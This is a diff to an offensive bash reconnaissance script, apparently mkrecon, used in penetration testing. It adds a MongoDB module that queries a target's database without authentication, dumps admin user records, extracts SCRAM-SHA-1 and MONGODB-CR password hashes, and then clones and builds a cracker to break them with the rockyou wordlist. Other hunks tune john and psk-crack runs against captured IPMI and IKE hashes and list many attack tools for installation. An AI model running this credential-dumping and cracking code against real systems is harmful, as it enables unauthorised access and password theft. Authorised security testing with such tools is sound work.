@@ -1,6 +1,6 @@
 #!/bin/bash
 # https://github.com/mtkirby/mkrecon
-# version 20180704
+# version 20180705
 
 umask 077
 
@@ -199,7 +199,7 @@ function MAIN()
             # sometimes nmap can't identify a web service, so just try anyways
             if [[ $protocol == 'tcp' ]] \
             && echo "... testing $port for http with wget" \
-            && timeout --kill-after=10 --foreground 90 \
+            && timeout --kill-after=10 --foreground 30 \
                 wget -U "$USERAGENT" --tries=3 --retry-connrefused -O /dev/null --no-check-certificate \
                     -S -D $TARGET --method=HEAD http://${TARGET}:${port} 2>&1 \
                     |egrep -qi 'HTTP/|X-|Content|Date' \
@@ -213,7 +213,7 @@ function MAIN()
             fi
             if [[ $protocol == 'tcp' ]] \
             && echo "... testing $port for https with wget" \
-            && timeout --kill-after=10 --foreground 90 \
+            && timeout --kill-after=10 --foreground 30 \
                 wget -U "$USERAGENT" --tries=3 --retry-connrefused -O /dev/null --no-check-certificate \
                     -S  -D $TARGET  --method=HEAD https://${TARGET}:${port} 2>&1 \
                     |egrep -qi 'HTTP/|X-|Content|Date' \
@@ -363,6 +363,17 @@ function MAIN()
                 ipmiScan &
             fi
         
+            # mongo
+            if [[ $protocol == 'tcp' ]] \
+            && [[ $service =~ mongodb ]] 
+            then
+                echo "starting mongoScan for port $port"
+                echo "... outputs $RECONDIR/${TARGET}.$port.mongo"
+                echo "... outputs $RECONDIR/${TARGET}.$port.mongo.scramsha1hashes"
+                echo "... outputs $RECONDIR/${TARGET}.$port.mongo.mongocrhashes"
+                mongoScan $port &
+            fi
+        
             # memcache
             if [[ $protocol == 'tcp' ]] \
             && [[ $service =~ memcached ]] 
@@ -388,7 +399,7 @@ function MAIN()
             # nmap sometimes shows mesos as "unknown", so probe for a page
             if [[ $protocol == 'tcp' ]] \
             && [[ $version =~ Mesos ]] \
-            || curl -A "$USERAGENT" --retry 20 --retry-connrefused -k \
+            || timeout --kill-after 10 --foreground 30 curl -A "$USERAGENT" --retry 20 --retry-connrefused -k \
                 -s http://${TARGET}:${port}/showme404 2>&1 \
                 |grep -q timestamp
             then
@@ -795,7 +806,7 @@ function buildEnv()
     local pkg
     local icdir
     local testdir
-    local pkgs="alien arachni bind9-host blindelephant brutespray cewl clusterd curl dirb dnsenum dnsrecon dos2unix exif exploitdb eyewitness git hsqldb-utils hydra ike-scan iproute2 john joomscan jq kafkacat ldap-utils libcurl4-openssl-dev libgmp-dev libnet-whois-ip-perl libxml2-utils libwww-mechanize-perl libpostgresql-jdbc-java libmysql-java libjt400-java libjtds-java libderby-java libghc-hdbc-dev libhsqldb-java mariadb-common metasploit-framework ncat ncrack nikto nmap nmap-common nsis open-iscsi openvas-cli postgresql-client-common python-pip routersploit rpcbind rpm rsh-client ruby screen seclists skipfish sqlline snmpcheck time tnscmd10g unzip wafw00f wapiti wfuzz wget whatweb wig wordlists wpscan xmlstarlet zaproxy"
+    local pkgs="alien arachni bind9-host blindelephant brutespray cewl clusterd curl dirb dnsenum dnsrecon dos2unix exif exploitdb eyewitness git golang-go golang-golang-x-crypto-dev hsqldb-utils hydra ike-scan iproute2 john joomscan jq kafkacat ldap-utils libcurl4-openssl-dev libgmp-dev libnet-whois-ip-perl libxml2-utils libwww-mechanize-perl libpostgresql-jdbc-java libmysql-java libjt400-java libjtds-java libderby-java libghc-hdbc-dev libhsqldb-java mariadb-common metasploit-framework mongo-tools mongodb-clients ncat ncrack nikto nmap nmap-common nsis open-iscsi openvas-cli postgresql-client-common python-pip routersploit rpcbind rpm rsh-client ruby screen seclists skipfish sqlline snmpcheck time tnscmd10g unzip wafw00f wapiti wfuzz wget whatweb wig wordlists wpscan xmlstarlet zaproxy"
 
     for pkg in $pkgs
     do
@@ -1704,7 +1715,7 @@ function ikeScan()
     if [[ -f "$RECONDIR"/${TARGET}.${port}.ike-scan.key ]]
     then
         timeout --kill-after=10 --foreground 172800 \
-            psk-crack -d /usr/share/wordlists/rockyou.txt "$RECONDIR"/${TARGET}.${port}.ike-scan.key \
+            nice psk-crack -d /usr/share/wordlists/rockyou.txt "$RECONDIR"/${TARGET}.${port}.ike-scan.key \
             >>"$RECONDIR"/${TARGET}.${port}.ike-scan.key.crack 2>&1
     fi
 
@@ -2769,9 +2780,6 @@ function wfuzzURLs()
             post="-d \"$post\""
         fi
 
-        grep -v sleep /usr/share/seclists/Fuzzing/Command-Injection-commix.txt \
-            >"$RECONDIR"/tmp/Command-Injection-commix.txt
-
         for fuzzdict in /usr/share/wfuzz/wordlist/vulns/sql_inj.txt \
             /usr/share/wfuzz/wordlist/vulns/dirTraversal-nix.txt \
             /usr/share/wfuzz/wordlist/vulns/dirTraversal-win.txt \
@@ -2787,8 +2795,7 @@ function wfuzzURLs()
             /usr/share/seclists/Fuzzing/XSS-JHADDIX.txt \
             /usr/share/seclists/Fuzzing/XSS-RSNAKE-.txt \
             /usr/share/seclists/Fuzzing/XSS-STRINGS-BRUTELOGIC.txt \
-            /usr/share/seclists/Fuzzing/XXE-Fuzzing.txt \
-            "$RECONDIR"/tmp/Command-Injection-commix.txt 
+            /usr/share/seclists/Fuzzing/XXE-Fuzzing.txt
         do
             if [[ ! -f "$fuzzdict" ]]
             then
@@ -3174,6 +3181,156 @@ function zookeeperScan()
 ################################################################################
 
 ################################################################################
+function mongoCrack()
+{
+    local port=$1
+    local dir
+
+    for dir in /usr/lib/go-*
+    do
+        export GOPATH=$GOPATH:$dir
+    done
+    export GOPATH=$GOPATH:/usr/share/gocode
+
+    if [[ ! -d /tmp/krkr ]]
+    then
+        git clone https://github.com/averagesecurityguy/krkr /tmp/krkr >/dev/null 2>&1
+    fi
+
+    chmod -R 700 /tmp/krkr
+    cd /tmp/krkr
+    go build >/dev/null 2>&1
+    if [[ ! -f /tmp/krkr/krkr ]]
+    then
+        echo "FAILED TO BUILD krkr"
+        return 1
+    fi
+
+    if [[ -f "$RECONDIR"/${TARGET}.$port.mongo.scramsha1hashes ]]
+    then
+        echo "Cracking Mongo Scram hashes with rockyou dictionary"
+        echo "... outputs $RECONDIR/${TARGET}.$port.mongo.scramsha1hashes.cracked"
+        timeout --kill-after=10 --foreground 172800 \
+            nice \
+            /tmp/krkr/krkr -t mongo-scram -w /usr/share/wordlists/rockyou.txt \
+            -f "$RECONDIR"/${TARGET}.$port.mongo.scramsha1hashes \
+            >> "$RECONDIR"/${TARGET}.$port.mongo.scramsha1hashes.cracked 2>&1
+    fi
+    if [[ -f "$RECONDIR"/${TARGET}.$port.mongo.mongocrhashes ]]
+    then
+        echo "Cracking Mongo CR hashes with rockyou dictionary"
+        echo "... outputs $RECONDIR/${TARGET}.$port.mongo.mongocrhashes.cracked"
+        timeout --kill-after=10 --foreground 172800 \
+            nice \
+            /tmp/krkr/krkr -t mongo-cr -w /usr/share/wordlists/rockyou.txt \
+            -f "$RECONDIR"/${TARGET}.$port.mongo.mongocrhashes \
+            >> "$RECONDIR"/${TARGET}.$port.mongo.mongocrhashes.cracked 2>&1
+    fi
+
+
+    return 0
+}
+################################################################################
+
+################################################################################
+function mongoScan()
+{
+    local port=$1
+    local db
+    local IFS=$'\n'
+    local user
+    local db
+    local iterationcount
+    local salt
+    local storedkey
+    local hash
+
+
+    echo "$BORDER" >> "$RECONDIR"/${TARGET}.$port.mongo
+    echo "# use admin; db.system.users.find()" >> "$RECONDIR"/${TARGET}.$port.mongo
+    echo -e "use admin\ndb.system.users.find()" \
+        |timeout --kill-after=10 --foreground 600 \
+        mongo --host=$TARGET --port=$port 2>/dev/null \
+        |egrep '^{' \
+        |jq -M . \
+        >> "$RECONDIR"/${TARGET}.$port.mongo
+    echo "$BORDER" >> "$RECONDIR"/${TARGET}.$port.mongo
+
+    echo "$BORDER" >> "$RECONDIR"/${TARGET}.$port.mongo
+    echo "# db.stats(); db.hostInfo(); db.version()" >> "$RECONDIR"/${TARGET}.$port.mongo
+    echo -e "db.stats()\ndb.hostInfo()\ndb.version()" \
+        |timeout --kill-after=10 --foreground 600 \
+        mongo --host=$TARGET --port=$port 2>&1 \
+        |egrep -v '^MongoDB |^connecting to|^WARNING: |^bye' \
+        >> "$RECONDIR"/${TARGET}.$port.mongo
+    echo "$BORDER" >> "$RECONDIR"/${TARGET}.$port.mongo
+
+    echo "$BORDER" >> "$RECONDIR"/${TARGET}.$port.mongo
+    echo "# show dbs" >> "$RECONDIR"/${TARGET}.$port.mongo
+    echo -e "show dbs" \
+        |timeout --kill-after=10 --foreground 600 \
+        mongo --host=$TARGET --port=$port 2>/dev/null \
+        |egrep -v '^MongoDB |^connecting to|^WARNING: |^bye' \
+        >> "$RECONDIR"/${TARGET}.$port.mongo
+    echo "$BORDER" >> "$RECONDIR"/${TARGET}.$port.mongo
+
+    for db in $(echo -e "show dbs" \
+        |timeout --kill-after=10 --foreground 600 \
+        mongo --host=$TARGET --port=$port 2>&1 \
+        |egrep -v '^MongoDB |^connecting to|^WARNING: |^bye' \
+        |awk '{print $1}')
+    do
+        echo "$BORDER" >> "$RECONDIR"/${TARGET}.$port.mongo
+        echo "# use $db; db.getCollectionNames(); db.getUsers()" \
+            >> "$RECONDIR"/${TARGET}.$port.mongo
+        echo -e "use $db\ndb.getCollectionNames()\ndb.getUsers()" \
+            |timeout --kill-after=10 --foreground 600 \
+            mongo --host=$TARGET --port=$port 2>&1 \
+            |egrep -v '^MongoDB |^connecting to|^WARNING: |^bye' \
+            >> "$RECONDIR"/${TARGET}.$port.mongo
+        echo "$BORDER" >> "$RECONDIR"/${TARGET}.$port.mongo
+    done
+
+    if grep -q credentials "$RECONDIR"/${TARGET}.$port.mongo 2>/dev/null
+    then
+        for line in $(echo -e "use admin\ndb.system.users.find()" \
+            | timeout --kill-after=10 --foreground 600 \
+            mongo --host=$TARGET --port=$port \
+            |egrep '{' \
+            |jq -c -M .)
+        do
+            if [[ $line =~ SCRAM-SHA-1 ]]
+            then
+                user=$(echo $line |sed -e 's|.*"user":"\([^"]*\)".*|\1|')
+                db=$(echo $line |sed -e 's|.*"db":"\([^"]*\)".*|\1|')
+                iterationcount=$(echo $line |sed -e 's|.*"iterationCount":\([0-9]*\),.*|\1|')
+                salt=$(echo $line |sed -e 's|.*"salt":"\([^"]*\)".*|\1|')
+                storedkey=$(echo $line |sed -e 's|.*"storedKey":"\([^"]*\)".*|\1|')
+                echo "$user:$db:\$scram\$$iterationcount\$$salt\$$storedkey" \
+                    >> "$RECONDIR"/${TARGET}.$port.mongo.scramsha1hashes
+            elif [[ $line =~ MONGODB-CR ]]
+            then
+                user=$(echo $line |sed -e 's|.*"user":"\([^"]*\)".*|\1|')
+                hash=$(echo $line |sed -e 's|.*"MONGODB-CR":"\([^"]*\)".*|\1|')
+                echo "$user:$hash" >> "$RECONDIR"/${TARGET}.$port.mongo.mongocrhashes
+            fi
+        done
+    fi
+
+    if [[ -f "$RECONDIR"/${TARGET}.$port.mongo.scramsha1hashes ]] \
+    || [[ -f "$RECONDIR"/${TARGET}.$port.mongo.mongocrhashes ]]
+    then
+        echo "Running mongoCrack"
+        echo "... outputs $RECONDIR/${TARGET}.$port.mongo.scramsha1hashes.cracked"
+        echo "... outputs $RECONDIR/${TARGET}.$port.mongo.mongocrhashes.cracked"
+        mongoCrack $port
+    fi
+
+    return 0
+}
+################################################################################
+
+################################################################################
 function memcacheScan()
 {
     local cmdfile="$RECONDIR"/tmp/memcached.${port}.metasploit
@@ -3224,10 +3381,10 @@ function ipmiScan()
     if [[ -f $RECONDIR/${TARGET}.ipmi.john ]]
     then
         timeout --kill-after=10 --foreground 86400 \
-            john --wordlist=$RECONDIR/tmp/passwds.lst --rules=Single $RECONDIR/${TARGET}.ipmi.john \
+            nice john --wordlist=$RECONDIR/tmp/passwds.lst --rules=Single $RECONDIR/${TARGET}.ipmi.john \
             >>"$RECONDIR"/tmp/ipmi.john.out 2>&1
         timeout --kill-after=10 --foreground 86400 \
-            john --wordlist=/usr/share/wordlists/rockyou.txt --rules=Single $RECONDIR/${TARGET}.ipmi.john \
+            nice john --wordlist=/usr/share/wordlists/rockyou.txt --rules=Single $RECONDIR/${TARGET}.ipmi.john \
             >>"$RECONDIR"/tmp/ipmi.john.out 2>&1
         john --show $RECONDIR/${TARGET}.ipmi.john >$RECONDIR/${TARGET}.ipmi.john.cracked 2>&1
     fi
@@ -3892,6 +4049,7 @@ set > /tmp/set1
 export PYTHONHTTPSVERIFY=0
 export PERL_LWP_SSL_VERIFY_HOSTNAME=0
 shopt -s nocasematch
+renice 5 $$
 
 MAIN $*
 stty sane >/dev/null 2>&1
